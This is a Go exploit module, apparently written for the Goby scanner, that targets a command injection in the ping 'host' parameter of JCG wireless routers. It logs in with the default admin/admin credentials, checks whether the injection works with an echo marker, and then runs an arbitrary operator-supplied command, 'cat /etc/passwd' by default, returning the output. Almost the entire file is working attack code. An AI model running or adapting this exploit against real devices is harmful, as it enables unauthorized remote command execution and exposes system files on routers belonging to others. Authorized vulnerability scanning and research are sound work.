package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JCG Wireless Route Ping Host RCE",
    "Description": "The host parameter of the product in the /goform/sysTools file has a command injection vulnerability, but it needs to be logged in to use it. This PoC is based on the account password admin/admin",
    "Product": "JCG-Wireless-Route",
    "Homepage": "http://www.jcgcn.com",
    "DisclosureDate": "2021-06-02",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "product=\"JCG-wireless router\"",
    "Level": "3",
    "Impact": "<p>Hackers can execute arbitrary commands on the server and write into the backdoor, thereby invading the server and obtaining the administrator's authority of the server, which is very harmful.</p>",
    "Recommendation": "<p>Strictly filter the data entered by the user and prohibit the execution of system commands.</p>",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzI1ODEzNTEyMw==&mid=2649616821&idx=7&sn=1b1472b50f5243d1928e0e217750f551&scene=0"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10199"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(5)
			cfgPost := httpclient.NewPostRequestConfig("/goform/sysTools")
			cfgPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgPost.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgPost.FollowRedirect = true
			cfgPost.VerifyTls = false
			cfgPost.Data = fmt.Sprintf("tool=0&pingCount=4&host=127.0.0.1;echo+%s\"\"%s&sumbit=%%E7%%A1%%AE%%E5%%AE%%9A", randStr, randStr)
			if resp, err := httpclient.DoHttpRequest(u, cfgPost); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, randStr+randStr))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfgPost := httpclient.NewPostRequestConfig("/goform/sysTools")
			cfgPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgPost.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgPost.FollowRedirect = true
			cfgPost.VerifyTls = false
			cfgPost.Data = "tool=0&pingCount=4&host=127.0.0.1; " + fmt.Sprintf("%s", cmd) + "&sumbit=%E7%A1%AE%E5%AE%9A"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgPost); err == nil {
				expResult.Success = true
				resinfo := regexp.MustCompile(`(?s)readonly="1">(.*?)</textarea>`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = resinfo
			}
			return expResult
		},
	))
}
